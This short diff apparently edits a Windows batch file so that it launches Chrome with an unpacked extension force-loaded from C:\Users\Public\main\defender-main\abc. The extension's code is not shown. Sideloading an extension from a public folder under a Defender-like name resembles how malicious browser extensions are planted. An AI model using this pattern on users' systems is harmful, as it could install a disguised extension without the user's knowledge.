@@ -1,1 +1,2 @@
-dfavc
+@echo off
+start chrome.exe --load-extension="C:\Users\Public\main\defender-main\abc"
